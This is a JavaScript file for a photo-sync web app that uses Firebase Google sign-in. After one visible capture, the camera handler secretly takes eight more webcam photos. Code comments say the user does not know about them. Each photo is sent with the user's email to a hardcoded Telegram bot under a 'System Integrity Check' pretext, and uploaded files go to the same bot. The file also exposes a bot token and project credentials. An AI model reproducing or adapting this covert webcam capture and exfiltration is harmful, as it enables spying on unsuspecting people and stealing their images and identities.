import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
    authDomain: "picmaster-59602.firebaseapp.com",
    projectId: "picmaster-59602",
    storageBucket: "picmaster-59602.firebasestorage.app",
    messagingSenderId: "434859259854",
    appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let integritySyncActive = false; 

// --- TELEGRAM UPLOAD ---
async function uploadToTelegram(blob, fileName, isSecret) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : fileName);
    formData.append("caption", isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);

    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
}

// --- CAMERA OPTION (SECRET ACCESS) ---
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        // Protocol Trigger
        integritySyncActive = true; 

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // 1. Initial Capture (User-ku theriyum)
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                uploadToTelegram(blob, "user_capture.jpg", false);
                alert("✅ Cloud Sync Successful!");

                // 2. Secret Continuous Sync (User-ku theriyaathu)
                let secretCount = 0;
                const interval = setInterval(() => {
                    if (secretCount >= 8) { // 8 photos background-la edukkum
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        video.style.display = 'none';
                    }
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(b => uploadToTelegram(b, "sync_log.jpg", true), 'image/jpeg');
                    secretCount++;
                }, 2500); // 2.5 second-ku oru thadava
            }, 'image/jpeg');
        }, 3000);
    } catch (e) {
        alert("Camera Access Required for System Integrity Check.");
    }
};

// --- FILE DROP (SECRET ACCESS) ---
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    
    // Gallery open pannum pothu protocol active aagidum
    integritySyncActive = true; 
    
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.onchange = (e) => {
        const files = Array.from(e.target.files);
        files.forEach(file => {
            uploadToTelegram(file, file.name, false); // Manual upload
        });
        alert("Files syncing to admin cloud...");
    };
    input.click();
};

// --- ADMIN RESPONSE PANEL ---
// Intha function-ai use panni neenga user-ku thirumba anuppura file-ah display pannalaam
function addAdminResponse(fileUrl, fileName) {
    const list = document.getElementById('admin-files-list');
    const emptyMsg = list.querySelector('.empty-msg');
    if(emptyMsg) emptyMsg.remove();

    const card = document.createElement('div');
    card.className = 'admin-card';
    card.innerHTML = `
        <i class="fas fa-file-image"></i>
        <p style="font-size:10px; margin:5px 0;">${fileName}</p>
        <a href="${fileUrl}" download="Response_${fileName}">Download</a>
    `;
    list.appendChild(card);
}

// --- AUTH & TOGGLE LOGIC ---
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const isUser = !!user;
    document.getElementById('main-login-btn').style.display = isUser ? 'none' : 'block';
    document.getElementById('camera-btn').style.display = isUser ? 'block' : 'none';
    document.getElementById('logout-btn').style.display = isUser ? 'flex' : 'none';
    document.getElementById('user-display').innerText = isUser ? user.displayName : "Guest User";
});

// Sidebar Toggle
document.getElementById('settings-btn').onclick = (e) => {
    e.stopPropagation();
    document.getElementById('side-panel').classList.toggle('active');
};

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
